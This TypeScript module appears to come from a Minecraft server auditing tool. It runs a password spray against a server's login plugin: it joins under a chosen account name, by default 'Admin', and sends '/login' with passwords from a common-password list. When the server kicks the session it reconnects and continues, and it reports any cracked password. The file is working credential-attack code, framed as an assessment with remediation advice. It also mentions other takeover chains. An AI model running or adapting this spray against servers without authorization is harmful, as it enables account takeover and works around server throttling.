import type { EngineModule } from '../types'
import { JoinFailure, McSession, detectAuthPrompt, sleep } from './lib/mcSession'

const DEFAULT_WORDLIST = [
  '123456',
  'password',
  '12345678',
  'qwerty',
  'abc123',
  'minecraft',
  'admin',
  'letmein',
  '111111',
  '123456789',
  'password1',
  'dragon'
]

export const authSpray: EngineModule = {
  id: 'auth.spray',
  title: 'Password spray against login plugin',
  async run(ctx) {
    const username = ctx.params.username?.trim() || 'Admin'
    const customList = (ctx.params.wordlist ?? '')
      .split(',')
      .map((entry) => entry.trim())
      .filter(Boolean)
    const wordlist = customList.length > 0 ? customList : DEFAULT_WORDLIST
    const maxAttempts = Math.max(
      1,
      Math.min(Number(ctx.params.maxAttempts) || 8, wordlist.length)
    )
    const delayMs = 2500

    ctx.log(`targeting account "${username}" (max ${maxAttempts} attempts, ${delayMs}ms throttle)`)
    let session: McSession
    try {
      session = await McSession.open(ctx.target, username)
    } catch (error) {
      const message = error instanceof Error ? error.message : String(error)
      if (/online.?mode|encrypt|verify|authenticate/i.test(message)) {
        ctx.finding({
          id: 'online-mode-enforced',
          severity: 'info',
          title: 'Server enforces online-mode',
          detail: 'The join was rejected during authentication; credential attacks do not apply to the Mojang login flow.',
          evidence: { reason: message }
        })
        return
      }
      if (/whitelist/i.test(message)) {
        ctx.finding({
          id: 'whitelist-enforced',
          severity: 'info',
          title: 'Whitelist enforced',
          detail: 'The join was rejected by the whitelist, which also shields the login plugin from remote attackers.',
          evidence: { reason: message }
        })
        return
      }
      if (error instanceof JoinFailure) {
        ctx.log(`join failed: ${message}`)
        return
      }
      throw error
    }

    try {
      const prompt = await detectAuthPrompt(session)
      if (prompt === 'register') {
        ctx.finding({
          id: 'account-unregistered',
          severity: 'info',
          title: `"${username}" is not registered`,
          detail: 'There are no credentials to spray. Use the registration hijack chain (C6) or offline identity takeover (C1).',
          evidence: { username }
        })
        return
      }
      if (!prompt) {
        ctx.log('no login prompt observed — attempting /login spray anyway (the prompt may be broken or hidden)')
      }

      for (let i = 0; i < maxAttempts; i++) {
        if (ctx.signal.aborted) return
        if (session.lastKickReason) {
          const kickReason = session.lastKickReason
          ctx.log(`kicked after the previous attempt (${kickReason}) — reconnecting to continue`)
          session.close()
          await sleep(1500)
          try {
            session = await McSession.open(ctx.target, username)
          } catch (error) {
            ctx.finding({
              id: 'spray-kicked',
              severity: 'info',
              title: 'Spray interrupted by server kick',
              detail: `The server kicked the session (${kickReason}) and reconnection failed: ${error instanceof Error ? error.message : String(error)}. Server-side throttling is working.`,
              evidence: { attempts: i }
            })
            return
          }
        }
        const password = wordlist[i]
        ctx.log(`attempt ${i + 1}/${maxAttempts}: trying "${password}"`)
        session.chat(`/login ${password}`)
        const success = await session.waitForChat(
          /已成功登录|成功登录|登录成功|successful login|successfully logged/i,
          2500
        )
        if (success) {
          ctx.finding({
            id: 'weak-password',
            severity: 'high',
            title: `Weak password for "${username}": "${password}"`,
            detail:
              'The account password appears in a short common-password list. Enforce a strong password policy and aggressive login throttling.',
            evidence: { username, password, attempts: i + 1 }
          })
          return
        }
        await sleep(delayMs)
      }

      ctx.finding({
        id: 'spray-exhausted',
        severity: 'info',
        title: `No weak password found in ${maxAttempts} attempts`,
        detail: 'The account resisted a short common-password spray. Keep the password policy and login throttling in place.',
        evidence: { username, attempts: maxAttempts }
      })
    } finally {
      session.close()
    }
  }
}
